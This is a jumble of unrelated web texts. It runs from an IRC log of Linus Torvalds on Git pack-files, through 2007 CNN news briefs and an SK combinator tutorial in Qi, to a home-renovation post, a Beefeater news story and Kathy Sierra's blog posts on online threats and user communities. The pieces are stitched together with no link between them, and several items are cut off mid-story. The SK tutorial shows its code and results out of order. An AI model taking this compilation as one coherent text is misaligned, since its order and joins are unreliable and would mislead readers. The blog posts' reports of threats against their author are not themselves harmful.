And for those of you paying attention , the Omniscient Trick has just been detailed !
< linus >
Yes , we always write out most recent first < njs` >
And , yeah , I got the part about deeper - in - history stuff having worse IO characteristics , one sort of does n't care .
< linus >
With the caveat that if the " most recent " needs an older object to delta against ( hey , shrinking sometimes does happen ) , we write out the old object with the delta .
< njs` > ( if only it happened more ... ) < linus >
Anyway , the pack - file could easily be denser still , but because it 's used both for streaming ( the Git protocol ) and for on - disk , it has a few pessimizations .
Actually , it is a made - up word .
But it is a made - up word being used as setup for a later optimization , which is a real word : < linus >
In particular , while the pack - file is then compressed , it 's compressed just one object at a time , so the actual compression factor is less than it could be in theory .
But it means that it's all nice random - access with a simple index to do " object name -> location in packfile " translation .
< njs` >
I 'm assuming the real win for delta-ing large -> small is more homogeneous statistics for gzip to run over ?
( You have to put the bytes in one place or another , but putting them in a larger blob wins on compression )
Actually , what is the compression strategy -- each delta individually gzipped , the whole file gzipped , somewhere in between , no compression at all , ....?
Right .
Reality IRC sets in .
For example : < pasky >
I 'll read the rest in the morning , I really have to go sleep or there 's no hope whatsoever for me at the today 's exam ... g'nite all .
Heh. < linus > pasky : g'nite < njs` > pasky : ' luck < linus >
Right : large -> small matters exactly because of compression behaviour .
If it was non-compressed , it probably would n't make any difference .
< njs` > yeah < linus >
Anyway : I 'm not even trying to claim that the pack - files are perfect , but they do tend to have a nice balance of density vs ease - of use .
Gasp !
OK , saved .
That 's a fair Engineering trade off .
Close call !
In fact , Linus reflects on some Basic Engineering Fundamentals , design options , etc. < linus >
More importantly , they allow Git to still _conceptually_ never deal with deltas at all , and be a " whole object " store .
Which has some problems ( we discussed bad huge - file behaviour on the Git lists the other day ) , but it does mean that the basic Git concepts are really really simple and straightforward .
It 's all been quite stable .
Which I think is very much a result of having very simple basic ideas , so that there 's never any confusion about what 's going on .
Bugs happen , but they are " simple " bugs .
And bugs that actually get some object store detail wrong are almost always so obvious that they never go anywhere .
< njs` > Yeah .
Nuff said .
< linus > Anyway .
I 'm off for bed .
It 's not 6 AM here , but I 've got three kids , and have to get up early in the morning to send them off .
I need my beauty sleep .
< njs` > :-) < njs` > appreciate the infodump , I really was failing to find the details on Git packs :-)
And now you know the rest of the story .

Hyundai chairman given suspended sentence for embezzlement
SEOUL , South Korea ( CNN ) -- Hyundai Chairman Chung Mong - koo escaped a prison sentence for embezzlement after a South Korean court ruled Thursday to instead impose a suspended five year sentence , according to a company spokesman .
In February , the 68 - year - old executive was sentenced to three years in prison after being convicted of embezzling money from the South Korean conglomerate .
He appealed that verdict and on Thursday the company said Chung will now only be required to undertake community service .
Chung was accused of funneling $ 106 million in company money into a slush fund to seek favors from the government and with breach of trust for incurring more than $ 300 million in damages to the company .
Chung spent two months in jail after his arrest last April before being released on $ 1 million bail .
He admitted using affiliated companies to set up slush funds , but said he knew no details of the arrangements .

Law enforcement sources tie bomb threat suspect to bank robbery , other crimes
WASHINGTON ( CNN ) --
The man believed to be responsible for the recent rash of telephoned bomb threats to businesses across the United States has been tied to other crimes including a Miami Beach bank robbery and a wire fraud case in New York , law enforcement sources said Wednesday .
Two federal officials familiar with the investigation said the suspect in the wave of extortion calls demanding money to avoid bombings is a Portuguese citizen they identified as 27 - year - old Allan Sharif .
CNN has previously reported that the person responsible for the threats was believed to be in Portugal .
The FBI , which is leading the investigation into the threats , refused to comment on the identity of the suspect .
Authorities have tied telephoned threats to at least 24 banks and stores in at least 15 states to Sharif .
Authorities have confirmed that in some cases businesses paid ransoms in the face of the bomb threats

Fossett search continues after disappointment
MINDEN , Nev. ( CNN ) --
The search for famed aviation adventurer Steve Fossett continued Wednesday afternoon after searchers were disappointed when wreckage they thought was his aircraft turned out to be from an old crash .
It could take a week , under ideal conditions , to cover the 600 square miles where it is thought Fossett might be , but there is still room for optimism , Maj. Cynthia Ryan of the Nevada Civil Air Patrol told reporters .
" We had what we thought was a pretty hard sighting , " she said .
" I have to tell you , the excitement level in the emergency operations center was high .

DHS announces steps against smuggling of nuclear devices into U.S .
WASHINGTON ( CNN ) --
Saying that terrorists could use private aircraft or small boats to smuggle a " dirty bomb " or nuclear device into the United States , Homeland Security Secretary Michael Chertoff told Congress Wednesday he will propose tightening rules regulating such craft
Under the plans , general aviation aircraft would be required to provide a passenger list before departing from overseas locations , and nuclear detection gear will be tested in the ports of Seattle and San Diego .
" We do worry about the fact that somebody could ... lease or occupy a private plane overseas and then use that as a way to smuggle in a dirty bomb or a weapon of mass destruction into the United States , " Chertoff said in a written statement .
" We do worry that having locked the front door , so to speak , against dangerous containers , someone could simply put the dangerous cargo in a private ocean - going vessel and take it into a U.S. port . "
Chertoff said the tightened security standards for general aviation operators would increase screening for nuclear materials overseas and require private aircraft coming in from overseas to send U.S. authorities a list of passengers and crew members before starting their flight .
Planes departing from Canada , Mexico and Caribbean nations would be included , a DHS spokesman said .

DHS burdened by congressional demands
WASHINGTON ( CNN ) --
The constant demands from Congress for testimony and reports is distracting Homeland Security officials from the job of securing the homeland , Secretary Michael Chertoff said in a letter to Congress Wednesday .
Chertoff said DHS " takes seriously " its responsibility to keep Congress informed , but the demands of responding to 86 committees and subcommittees that claim jurisdiction over parts of the department is hindering the department 's effectiveness .
" In my view , the problem is getting worse rather then better , " Chertoff wrote to Rep. Peter King , the majority leader on the House Homeland Security Committee .
" The number of very detailed written reports required of DHS by Congress is proliferating at an alarming rate . "
In the summer of 2004 , the 9/11 commission recommended that Congress create " a single , principal point of oversight and review " for homeland security .
To date , however , it remains one of the few recommendations that Congress has chosen to ignore .

Felix weakens but massive flooding still a concern for Central America
LA CEIBA , Honduras ( CNN ) -- Felix , downgraded to a tropical depression early Wednesday , was rapidly weakening as it crossed the mountains of Central America less than a day after making landfall as a fierce Category 5 hurricane .
But the storm still has enough punch to dump an expected 6 to 10 inches of rain on northern Nicaragua and El Salvador , while most of Honduras could up to 15 inches of rain .
Isolated maximum amounts of 25 inches are possible in mountainous areas , the center said , and these rains will " likely produce life - threatening flash floods and mud slides . "
The storm killed nine people on Nicaragua 's Miskito Coast , the country 's civil defense told CNN .

Attorney Frank Rubino filed a motion in U.S. District court to stay the extradition " because there is substantial reason to believe that the Republic of France , contrary to the representations of the United States , has no intention of applying the protection of the Geneva Convention , intending to instead treat General Noriega as a common criminal .

Federal agency warns more toy recalls likely
NEW YORK ( CNN ) --
Americans should expect more Chinese - made toys to be recalled in coming months , the Consumer Product Safety Commission said Wednesday after it and the Mattell company announced a new recall of 844,000 toys that contain excessive levels of lead paint .
It was the third such recall of Chinese - manufactured toys by Mattel this summer .
" If I were a betting person I 'd bet on more lead - paint recalls , " the agency 's director of information , Julie Vallese , told CNN Wednesday .
" It 's clear that lead paint on toys is not isolated just to Mattel . "
The CPSC anticipates Mattel 's smaller competitors will be announcing similar recalls as they complete thorough testing of their products , she said .

Attorney : Overturning guilty plea could allow Craig to remain in Senate
WASHINGTON ( CNN ) -- Embattled Sen. Larry Craig of Idaho could remain in the Senate if he manages to get his conviction on disorderly conduct overturned , an attorney for Craig told CNN Wednesday .
Stanley Brand , who is representing Craig in the Senate Ethics Committee investigation into the matter , said the committee has never disciplined a lawmaker for " private misdemeanor conduct . "
Craig , 62 , announced Saturday that he intended to resign by the end of September , following revelations that he had pleaded guilty last month to a disorderly conduct charge for allegedly making sexual advances to an undercover police officer in a restroom at the Minneapolis - St. Paul International Airport in June .
Craig spokesman Dan Whiting told KTVB in Boise , Idaho , Wednesday the senator is fighting the charge : " He is innocent , and he believes that there 's a good chance that he eventually will have this charge overturned and that the ( Senate ) Ethics Committee wo n't act against him . "

July drop was biggest ever for pending home sales
NEW YORK ( CNNMoney.com ) --
The meltdown in the mortgage market caused the biggest drop on record in July for pending home sales , taking the index down to the lowest level since the month that included the Sept. 11 , 2001 , terrorist attack .
The National Association of Realtors pending home sales index , which measures contracts to buy existing homes , fell 12.2 percent to a reading of 89.9 .
It the second lowest reading on record for the seven - year - old index , trailing only the 89.8 reading in September 2001 .
" Our members are telling us some sales contracts are n't closing because mortgage commitments have been falling through at the last moment , " said Lawrence Yun , the Realtors ' senior economist , in the index report .
The pending home index is more forward looking than the group 's existing home sales report , which measures home sales at the time a deal is closed , typically a month or two after a sales contract is signed .

Air Force admits bomber mistakenly flew nukes across country
WASHINGTON ( CNN ) -- A B - 52 bomber mistakenly carried six nuclear warheads on air - launched cruise missiles on a flight from North Dakota to Louisiana last week , prompting a major investigation , the Air Force has confirmed .
Lt. Col . Ed Thomas said that while the military does not publicly discuss nuclear weapons procedures , in this case the Air Force decided to acknowledge the incident in order to reassure the public .
" The public was never in any danger , " he said .
The plane was taking the cruise missiles from Minot Air Force Base to Barksdale Air Force Base on Thursday for decommissioning , but the warheads should have been removed from the missiles before they were attached to the B - 52 , according to military officials who spoke on condition of anonymity because of the extraordinary sensitivity and security surrounding the case .

Third recall of Mattel toys announced
NEW YORK ( CNN ) --
The Consumer Product Safety Commission , in cooperation with Mattel Inc. , announced a recall of 844,000 toys that contain excessive levels of lead paint Tuesday night -- the third such recall of Chinese - manufactured toys by Mattel this summer .

It said that 11 additional types of toys had been discovered that needed to be recalled .
" We 've promised consumers that we'd tell them efficiently and openly if we found any additional affected toys , and that is what we are doing today , " said Mattel .
Two Fisher - Price brand toys and various Barbie accessory toys were named in the recall , though the Barbie toys make up the majority of the affected toys .

More than 200 people were arrested a week ago in the same city for attending an illegal rock concert .
Parties , attended by members of both sexes , and where alcohol is consumed , are illegal in Iran .
The Iranian authorities have in recent months increased their enforcement of what is deemed to be moral behaviour .
Dress codes for women have been a particular target .
Police Col Majid Bazmun told the state Irna news agency that police surrounded the building in Karaj where the " decadent gathering " was taking place after acting on a tip - off from a member of the public .
Iran 's chief of police , Esmaeel Ahmadi Moghaddam , said that the crackdown of recent months , described officially as the drive to " elevate security in society " , would continue as it had proved popular with the public .
As a juxtaposition of my previous use of the Qi type checker to define the SK combinator calculus , I 'll now define it very simply in the Qi language directly .
I 'll present this as a tutorial to those new to the SK combinator calculus .
The SK calculus shows us that at maximum there are only three rules of logic : Pattern Matching , Deleting , and Copying .
It also shows that their is only one way of evaluating them , namely by application .
You can think of the three rules as " Highlighting " , " Cutting " , and " Pasting . "
With those three simple operations , the entirety of logic and mathematics can be reproduced with only your mouse !
Let us take a loot at deletion ...
We 'll call the operation K. Look at the following transformation .
Copy the [ [ kx ]y ] into a text editor .
Now highlight and " cut " all but the x using only the " cut " command and your mouse .
[ [kx ] y ] -> x
[ [ [ sx ] y ] z ] -> [ [ xz ] [yz ] ]
Now , we 'll make a new function S which stands for " paste " .
Try to make the following transformation of [ [ [ sx ] y]z ] in a text editor .
Remember you can only use " cut " and " paste " .
K deletes information and S copies things and applies it to other functions .
Now it should be very easy to understand what the first two lines of following code is doing .
( define sk- eval *
[ [k X ] Y ] -> X
[ [ [s F ] G ] X ] -> [ [ F X ] [ G X ] ]
[ X Y ] -> [ ( sk- eval X ) ( sk- eval Y ) ]
X -> X )
The last 2 lines simply tell the function to evaluate the inside of our 2 element lists and return anything it does n't know how to handle .
But you should notice that we have defined sk - eval * but not sk- eval , so we are not quite done yet .
What do we mean by evaluation ?
We should mean that every element has been reduced and modified until we get the same thing back out of our evaluation function as we put into it .
In math , an x for a function f with the properties f( x ) =x is known as a fixed point .
It simply means that we get the same input as output .
You should notice that " X -> X " in the sk - eval * function ( especially being last ) , makes this a case where we get to use the fix built - in function in Qi .
It keeps applying the function to itself until it reaches a fixpoint .
Then it stops .
( define sk- eval
X -> ( fix sk - eval * X ) )
( 36 - ) ( sk-eval [ [ [s k ] k ] a ] )
a
( 37 - ) ( sk-eval [ [ [s [ [s k ] k ] ] [ [s k ] k ] ] a ] )
[ a a ]
( define sk -> [s k ] )
( define kk -> [ k k ] )
( define ks -> [ k s ] )
( define z -> ( sk ) )
( define succ -> [ s [ [ s ( ks ) ] k ] ] )
( define plus -> [ [ s ( ks ) ] [ [ s [ k [ s [ k s ] ] ] ]
[ s ( kk ) ] ] ] )
( define mult -> [ [ s ( ks ) ] k ] )
( define one -> [ ( succ ) ( z ) ] )
( define two -> [ ( succ ) ( one ) ] )
( define three -> [ ( succ ) ( two ) ] )
( define four -> [ ( succ ) ( three ) ] )
( define five -> [ ( succ ) ( four ) ] )
( 40 -) ( sk-eval [ [ [ [ ( plus ) ( one ) ] ( two ) ] 1 ] 0 ] )
[ 1 [ 1 [ 1 0 ] ] ]
( 41 - ) ( sk-eval [ [ [ [ ( mult ) ( three ) ] ( two ) ] 1 ] 0 ] )
[ 1 [ 1 [ 1 [ 1 [ 1 [ 1 0 ] ] ] ] ] ]
That 's it !
That 's all it takes to complete the evaluator .
In our cut and paste metaphor , we would continue to make the required copy and pastes until we could no longer match s and k's with the rules defined above .
Now let us see it in action .
That 's pretty easy .
Now let us define some helper functions and show that this sk-eval function knows math .
And now it is time for it to do some math .
We will use 1 and 0 to as markers for our functional application to ensure that our evaluator will output a string of the answer in 1's but ended by a 0 .
You could easily host an named SK calculus with the addition of 2 lines of code .
I 'll leave that as an exercise to the reader .
That 's all there is to the SK Combinator Calculus .
It is a powerful enough system to define the entirety of mathematics and computation .
It shows that all you need is a basic way to match symbols , delete symbols , and copy symbols and you have a Turing Complete system .
( I know some squishy bio-computers that do this all the time and perhaps I 'll explore that idea in another post . )
From this very basic system , you get the entirety of reasoned knowledge .
The universe is a strange place indeed .
I hope this helped spread understanding about the SK combinator calculus .
Let me know of any questions you have !

I never thought I ’d say it , but Peter Andre has done me a favour .
Yes , the pint sized Aussie , famous for a questionable pop career and failed marriage to a loud ex model caught my attention with his twist on ITV favourite sixty minute makeover .
Now , I remember the show from my student years , with any excuse to watch a bit of trashy daytime TV to avoid getting some studying done .
As I recall , they did up a house in an hour , while an unsuspecting home - owner was out visiting a friend or doing some shopping .
In 2015 , though , it seems that the sixty minutes have mysteriously been relaxed , so much so that they start stripping wallpaper and doing other odd jobs a few days early .
The weird thing is , they ’ve still kept the name of the show the same , so it bears no resemblance to what actually happens .
I suppose some might claim that can be put down to artist licence .
Anyway , a show a few months back took on a house remarkably similar to my own , not only in terms of layout , but also the dated eighties ( OK , seventies ) décor .
It got me thinking – they allegedly only spent around £ 12,000 on the makeover , and updated almost exactly what I hate about my own humble abode .
Why not copy their blueprint , and make the same changes , if I know in advance I can afford to do so ?
So , I quickly discovered it ’s not as simple as it seemed in that hour ’s worth of TV ( perhaps that ’s the sixty minutes they ’re referring to ? ) .
A good example is the seemingly simple task of arranging skip hire in Doncaster .
My home town is hardly known for it ’s ability to keep up with the rest of the world , but I did n’t really expect things to be so hard to get right .
After trying to get hold of a company called Quick Skip who did n’t appear to answer the phone , and CH Middleton who did n’t seem to want to come all the way across Donny , I ended up just getting a quote on - line , and to my amazement , the company quoting me was the latter of those two , who suddenly could get to me after all .
Weird .
I quickly realised that tasks I thought would be simple , were in fact going to take me longer than I ’d hired the skip for , such as stripping back the crumbling plaster .
Perhaps one room at a time would have been a better plan , but I ’d already got the plasterer booked for a few days later .
In the end , I had a few of the rooms done properly , and the less dated ones skimmed over , so I could get on with decorating myself .
I ’d not realised that fresh plaster was so hard to paint either – I ’ve redecorated rooms in a day before , but after a couple of coats it was clear that a third was going to be required to get an even finish on the walls .
It was fast developing realisation that costs were starting to spiral , and I ’d not even finished painting the walls .
On the TV show , their budget kitted out the place with all sorts of accessories too !
Inevitably I finished up the immediate job and did what every other man in the country does faced with a difficult choice .
I downed tools and went to the pub .
And that is how the state of play remains today .
After a few days hard graft , the walls look great , but everything else is pretty much the same as it was before .
It may have taken over 500 years for feminism to breach the walls of the Tower of London , but visitors to the fortress are today being greeted by the first female Beefeater since the guards were established .
Moira Cameron , a 38 - year - old from Argyll , Scotland , will serve as one of the Yeoman Warders , the body that protects the crown jewels .
She will don the traditional blue - and - scarlet livery for her duties , which begin with opening the Beauchamp Tower and the Chapel Royal of St Peter ad Vincula .
Ms Cameron has spent the past two months training intensively to learn the 21 separate duties the Beefeaters perform each day , and the ceremony of the keys .
She was also required to become well versed in the history of the tower so that she can lead guided tours .
Ms Cameron is a warrant officer class two who joined the army at the age of 16 .
She was selected over five men who also applied for the vacancy .
Candidates must have been a warrant officer or senior noncommissioned officer , have served at least 22 years in the army , Royal Air Force or Royal Marines , and hold the medal for long service and good conduct .
As well as her salary , of around £ 20,000 , Ms Cameron will have the use of a subsidised apartment in the tower itself .
On a day - to - day basis , she will wear the dark blue " undress uniform " , saving the £ 3,500 red - and - gold costume for special occasions .
The tower 's Yeoman Warders date back to 1485 .
They are thought to owe their nickname Beefeaters to the daily ration of meat they received .
There are 35 Yeoman Warders at the Tower of London , plus the Chief Yeoman Warder and Yeoman Gaoler .
Their full title is Yeoman Warder of Her Majesty 's Royal Palace and Fortress the Tower of London , and Members of the Sovereign 's Body Guard of the Yeoman Guard Extraordinary .
My Favorite Graphs ... and the future
This blog has always been about optimism , creating better user experiences , helping users spend more time in flow , and learning .
There are 405 posts here .
More importantly , there are nearly 10,000 comments from y'all that add so much more to the topics , and from which myself and others have learned a great deal .
I do n't want the last thing people remember about this blog to be The Bad Things .
So , I 've moved my original " threats " post -- something many people find very difficult to look at -- to a different web page -- rather than keeping it as a post here .
If you want to read the original content of the post ( it lost some formatting ) , it 's here .
But I want the thing people see when they come here now to reflect what this blog has always been about , so I 'm including a few of my favorite pictures from the last two years here .
As for the future of this blog , I know I cannot just return to business as usual -- whatever absurd reasons have led to this much hatred for me ( and for what I write here ) will continue , so there is no reason to think the same things would n't happen again ... and probably soon .
That includes anything that raises ( or maintains ) my visibility , so I will not be doing speaking engagements -- especially at public events .
( And of course it 's not just me , it 's anyone with a lot of visibility .
Think : Scoble .
He can take it , I can 't . )
I made no money from this blog -- it was always a labor of love .
Contrary to what the critics have been saying , I was never on the " paid " speaking circuit , never used it to gain " lucrative consulting contracts " ( or even a single contract ) .
I do n't have Amazon affiliate links ... this blog was because I love helping and teaching and learning from readers .
That leaves me with ... what to do next ?
I have a few ideas , but I 'm now asking for any suggestions OTHER than simply returning to this blog and doing what I was doing before .
These are just some wild possibilities that many of you have come up with and sent me emails about .
Some are more reasonable or appealing to me than others .
I 'd love to hear more ideas , plus thoughts on the ones listed below .
1 ) Get a real job doing this , so that I can continue with the same kind of work , but without raising my own visibility .
In other words , it would be for a company and the focus would be off of me .
2 ) " Ghost write " for someone or something else .
I got myself into the Technorati Top 50 , I could help someone else ( if it 's for the right reasons ) raise their readership .
3 ) Create a fake persona and write as that fake person .
Unfortunately , almost everything I do has a look and style , and I do n't think the quality of my writing is suddenly going to improve , so it would be pretty obvious that it was me .
Still ... a rape fantasy about a fake person who lives thousands of miles from where I do would not effect me as deeply or as personally as when the dream / imagery is about the real me I do n't like this idea as much because anonymity -- NOT Owning Your Own Words -- is one of the biggest contributors to the problems that have driven me and thousands of others off their blogs or other online communities .
4 ) Turn THIS blog into a real group blog ... with a LOT of authors , and I would take more of an editorial role .
That way , I represent only a small percentage and the hatred / anger / threats would be more distributed .
Kind of a share - the - attacks approach ; )
More like 37 Signals , less like Scoble , where all personal attacks are directed at him instead of The Blog .
5 ) Right now , I could n't pay anyone else so the blog would have to be sponsored to pay other authors .
I would agree to sponsorship only if it was by someone / something I already love ( Apple ? Adobe ?
Google ?
Anyone interested ? )
( And of course I 'd also need authors , so if it looks like a group blog is the way to go , there will be a call for participants )
6 ) Make the blog private -- where only registered members can see it .
That way , it would be much more difficult ( and probably less fun ) for others to attack it and / or me .
It would simply be a private community .
My visibility would drop dramatically , yet I 'd still be able to write about the same topics .
This idea is one of my favorites -- but at the same time it is much less user - friendly ( you 'd have to log - in , no public RSS feed , etc. ) and that would be a really bad idea .
7 ) Do something else on the blog -- podcasts , video , e-books -- something other than the posts .
This might not make any difference , though .
But perhaps without the words and pictures ... it could just make it worse since it would still be my voice ( podcast ) or worse , my FACE ( video ) , although I 've considered cutting videos that would n't have to show me at all .
8 ) ? ? ?
Please help .
This will be the last post here quite some time , until I figure out what to do next .
Please enjoy the pictures ... most of them have been inspired by y'all .
( I will leave comments open , of course , but moderate with abandon .
There will be nothing nasty or personal in this thread .
Like I said , I want the last thing people see on this blog to reflect the spirit of this blog and its readers . ]

Death threats against bloggers are NOT " protected speech " ( why I cancelled my ETech presentations )
Update : I could not bear to leave this post up on the site , as one of the last things people will see and remember about this blog -- and especially with that horrible photo .
So , I have moved the post to a separate web page here .
The content is exactly as it was posted , athough it lost some formatting .
Comments are closed ( after 1100 of them ) , but you can still read them here .
I deleted only one comment from this thread .

Update / Joint Statement with Chris Locke
Chris Locke and I agreed to publish a statement , together ( both in our own words ) in advance of the story which will appear tomorrow ( Monday , April 2 ) on CNN , at 7:20 AM ( EST ) on " CNN American Morning " , and throughout the day on other CNN shows .
A quick explanation for the critics :
When I was first bombarded by the media about this story , I refused to answer questions .
Having no media experience , I found that when you do n't answer a reporter , they 'll tell your story without you , so I agreed to speak with a few .
When I was asked for a short CNN interview , I said that I would do it only if they would let me invite Chris Locke as well .
Needless to say , everyone including Chris was stunned to hear this .
But these stories should not be about me ...
I am simply one of a gazillion examples about what 's happening today both on and offline .
Nor is it a simple Nice Vs. Bully story , and I thought having us come to an understanding would encourage others to stop fighting on either of our behalves and try to listen first , and then talk , and maybe something good and useful really will come of this .
Although I 've learned a lot in the last few days , I still do not know who made the unclebobism photo post , or why , or whether that person is a real threat .
That part of the story has continued to devolve in even scarier ways .
So , this is the last post I 'll make for some time , and I 've closed comments because I cannot keep up with the hateful ones ( including those that post my home address and social security number , etc . )
I 'm sure I 'll be back in the future .
I appreciate the overwhelming support here and elsewhere more than I can possibly say .
I cannot thank you enough for your stories and encouragement and kind words .
I hope that people will continue talking , and with less rage on either side of the issue and more productive ideas for what to do going forward .

User Community and ROI
Every time I give a talk , someone always asks , " That 's all good and nice that helping users learn is the key to creating passionate users ... but who 's going to do all that extra work ?
Who 's going to make the extra tutorials and better docs ? "
Answer : your user community .
Think about all the things a strong user community can do for you : tech support , user training , marketing ( evangelism , word of mouth ) , third - party add - ons , even new product ideas .
And that 's not including any extra sales you might make on community / tribe items like t- shirts , stickers , and other gear .
Yes , there 's still a budget ... but we 've all seen third - party fan / user groups that got no support at all from " the mother ship " and yet thrived and gave users a level of support and training the company did n't provide .
But there 's still that little of issue of getting users involved , and for that -- the single biggest factor is getting users involved at a much earlier path on their learning journey than typically happens .
This picture is from an earlier post :
In Building a User Community Part 1 we talked about the importance of not only a strict " There Are No Dumb Questions " policy , but also an even more dedicated " There Are No Dumb Answers " message .
Today , this post will offer a few more tips on how to use your marketing budget ( tiny as it may be ) to build , support , and grow a user community from the beginning .
* Host some kind of discussion forum ( can include chat , wikis , and blogs as well ) , and do whatever it takes to get people there as soon as possible , ideally while the thing is still in beta ( but it 's never too late to start ! )
* Look on other third - party forums where users are discussing ( which usually means struggling ) your product , and find the most active people .
Reach out to your earliest adopters or strongest new users and offer them non-paid incentives for becoming active .
Chances are , if you have any users at all and your product is even the least bit complicated , people are discussing it somewhere .
This could be anywhere from Amazon product reviews to technical discussion boards and even comments on related blogs .
* Make these folks life - time " charter members " with special privileges and recognition as ' founders ' that nobody else will ever get .
* Have levels and rewards for participating ( but again , not money - - that totally changes the motivation , or at least the perceived motivation ) .
The rewards can simply be status , early access to betas , and especially restricted access to the developers where they can discuss their ideas or at least listen to the engineers and designers describe why they made the choices they did , etc .
[ Do n't reward people for post quantity alone ... if post - count is the only criteria , you end up with a zillion useless posts ] .
Study successful user group communities for examples ( like , say , javaranch .com -- 3/4 million unique visitors a month ) .
* Teach users how to help other members by creating documents ( or getting other users to write them ) on how to ask and answer questions in the most productive way .
* Include some just - for - fun activities in your community , like one ( usually ONLY one ) totally off - topic forum .
* Make sure there are interesting , easy - access ways for users to get to know more about one another .
Be SURE to have user profile pages that include gender , photos , and some other personal info in addition to the specifics related to this particular community .
Which leads to ...
* Encourage members to meet offline !
Hold a dirt - cheap User 's Conference , ideally in more than one city , to get things started .
Start a forum from the people who sign - up for the conference , and offer user group or forum leaders free entry to the event ( and be sure to have a private user group or forum leader cocktail reception ) .
Tips for that are in this recent post on face - to - face ) .
Create a document on How To Start A User Group , and make sure users know how to get it .
There is a great series of posts on how to start a user group written by the guys behind the Edmonton .
NET User Group .
( Thanks guys )
* Encourage forum moderators or other community leaders to have their own private discussion space .
* Do n't tolerate abuse of the beginners , but do n't force the experts to have to put up with newbie issues .
As any community matures , you must provide separate areas for newbies and experts ... if the community culture is one of generosity and motivation , there will still be enough experts who want to spend time helping newbies .
* Why not help your top community leaders get a book deal ?
You never know ... if it 's a tech topic , direct them ( or yourself ) over to Wiley publisher Joe Wikert for some excellent and candid advice ( search his archives , and you 'll find everything from how to write a proposal , whether you need an agent , etc . )
* Consider starting a monthly " official " user group membership subscription , with something that comes in the real mail each month .
Think about it .
Think about how you feel when Fedex or UPS pulls up with that little Amazon box with the smile on the side .
Each month , send them a newsletter or DVD .
Where 's the budget for that content ?
Get your users involved !
Have them submit things , and use the small monthly membership fee to cover the cost of materials and mailing , etc .
Maybe you can partner with a sponsor on this , to include other things in the monthly " kit . "
* Create limited - edition , not - for - sale t- shirts , stickers , and other gear JUST for the founding community members ( if you 're just getting started in building a community ) .
For ongoing communities , do the same thing and distribute them randomly , for free .
Use the principle of " intermittent variable reward " that works so well to make slot machines and twitter so addicting ; )
* Make your community leaders or even just active participants HEROES .
Create " superhero "
Moo cards for them .
Plaster their photos everywhere .
( Cute story I heard from a reader here -- she met her husband online while they were both moderators for an Autodesk CAD forum . )
* Host an offline retreat just for the key community leaders .
Ca n't afford to do what Microsoft does with its Search Champs ?
Ca n't afford to put people up at the " W " ?
Have a campout .
Supply the marshmallows .
* Above all , keep teaching members to teach other members .
Give everyone a crash course in learning theory .
The better they become at helping others -- the more skills they develop in mentoring / tutoring others -- the more meaningful and motivating it is for them to keep on doing it ..
These are just a few tips for now .
Stay tuned for more .
And of course , please add your own ... while I have quite a lot of user group / community experience having launched several groups from scratch , they were all technology - related , and many of you are from very different domains .

Is your app an ass - kisser ?
If your app was an employee , what kind of employee would it be ?
When it 's employee performance review time , how would you rate it ?
These are just a few of the apps I 've worked with recently ...
What other app / product employee - types are there ?
Know any apps that need an employee appraisal ?

Random Tuesday Links
Some Tuesday links :
Josh Clark ( globalmoxie ) has written a wonderful post about the power of mystery .
I highly , highly recommend it .
We love Jeff Atwood at Coding Horror , and thanks to Ryan Fox for pointing out this post on friendlier 404 pages .
Ryan was kind enough to refer to our 404 page here as " not great " as opposed to what he was actually thinking .
[ We 've added that to the list of things to fix . ]
Jacqueline Nagel translated one of our posts into German .
You 'll have to guess which post this was from .
Thanks Jacky !
There 's a very short video clip the SXSW folks put together , edited from my opening remarks there .
It 's not exactly the way it happened in the talk -- they cut things and rearranged things -- but it does show a couple of the slides about The Suck Threshold .
My good friends at Stikkit wrote to say they have integrated a version of the WTF button into an upcoming beta .
( You 'll see a WTF button in the video clip from SXSW ) .
I 'm sure Asha Dornfest will let us know when we can actually see it in action .
Pamela Slim , our favorite motivator for ( as her tagline says ) " how to go from corporate prisoner to thriving entrepreneur " has a new podcast show about the themes from Escape from Cubicle Nation .
Marty Baker has some good stuff on creativity at Creativity Central
Richard Sauerman started a new blog , Wake Up Tiger with a tagline and premise that sounds disturbingly a bit too self - helpish for me , but it is n't .
It 's funny , it 's creative and sassy ( manages to stay above the " cheesy / sappy " threshold ) , and it 's really making me smile !
( Warning : it is only 98 % safe for work ) .
Longtime reader here Thierry Koehrien has a new publishing project , and the English version is here .
Alright , Nathan and Max have a passion for ... ink .
Yes , ink .
Like the kind you put in your printer and pay too much for .
They even have a show , and against my will , I find myself enjoying this .
If these guys can make a passion - site out of ink , you can do it with frickin ' anything .
If you 're interested in humanizing the user 's experience ( and I know you are ) , do n't forget to check out Humanized .
Those of you at my SXSW opening know why The Daily Puppy is important .
As for the mystery behind the not - always - subliminal gratuitous puppy photos in my talk , I 'm leaving that for an exercise for the reader , although those of you who 've been to my older " Creating Passionate Users " talk have a pretty good idea .
The fun / silly thing was that throughout the week , a few other panelists threw random puppy photos into their slides , regardless of the topic .
I loved it .

Helping users " feel the fear and do it anyway "
We 've said before that reducing fear might be a killer app ... making something users were previously afraid of feel less threatening .
Wesabe does this for personal finances .
Dr. Laurie Kemet does this for a trip to the dentist .
And Electric Rain does this for 3D .
Our books try to do this for programming .
But what about a step beyond that ... where you help them do something that just IS really , seriously , scary ?
Making only things which are friendly and easy is not the holy grail of design .
Reduce my fear or guilt , and I 'll be grateful .
Help me do something that really IS scary , and I 'll be grateful and exhilarated .
I 'll be forever changed , and your company , product , or service will be linked to that change .
To reduce fear means taking something perceived as scary and showing users that it 's not .
But not everything can be made to appear friendly and easy and safe .
Like Apple 's Logic .
The learning curve is steep , it looks overwhelming and intimidating , but the payoff can be high .
What if instead of removing advanced features that make a product inherently daunting , it 's OK to say to users , " This IS hard .
Really , frickin' hard .
But we 'll get you through it . "
Sometimes , with some products , it 's OK to say , " We can't make this any easier or less scary , but we can help you come out the other side . "
A short time ago I went on the Sydney Bridge Climb .
At night .
It was the most frightening thing I 've ever done .
But when it was over , I felt braver , stronger , and different .
I 'll never forget the Bridge Climb , and I 'll probably be recommending it for the rest of my life .
We can reduce guilt :
We can reduce fear :
But helping a user be afraid and do it anyway is a powerful force .
We should n't be too quick to over - simplify a product or experience .
Of course , it 's up to us to get our users through the big , challenging , thing -- there 's a big responsibility for stellar documentation and support .
And we 're talking moral support , not just tech support , so building a user community is even more important with something really , really , scary .
I 've talked before about the benefits to us when we do something scary , but maybe we can help give those benefits to our advanced ( or trying to be ) users .
So , what scary thing have YOU done lately ?

How to host a product / feature design party
Want to design the next great web app ?
Upgrade your product , but can't decide what to add or change ?
Add a new feature to your product , but can't decide how to implement it ?
Forget focus groups .
Forget endless meetings and brainstorming sessions .
Throw an ultra - rapid - design party , and do it in a single day .
